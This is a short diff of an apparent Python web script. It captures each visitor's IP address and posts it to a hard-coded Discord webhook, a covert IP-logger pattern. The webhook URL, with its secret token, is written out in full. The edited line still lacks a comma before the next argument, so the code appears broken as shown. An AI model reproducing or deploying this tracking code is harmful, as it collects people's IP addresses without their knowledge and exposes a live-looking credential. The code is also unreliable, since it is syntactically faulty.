@@ -18,7 +18,7 @@ def main():
     ip = request.environ['REMOTE_ADDR']
   else:
     ip = request.environ['HTTP_X_FORWARDED_FOR']
-    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1011490283667591218/lN8aFMEsU_YhWN6l2Y9LcGUcEZgFiHKjOdfZlJcdIfFmum0vFjP33uj8DDEhpUjWdQmY',#put your webhook url
+    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1011490283667591218/lN8aFMEsU_YhWN6l2Y9LcGUcEZgFiHKjOdfZlJcdIfFmum0vFjP33uj8DDEhpUjWdQmY"#put your webhook url
 rate_limit_retry=True,
                          content=f'New Ip ||{ip}||')
   response = webhook.execute()
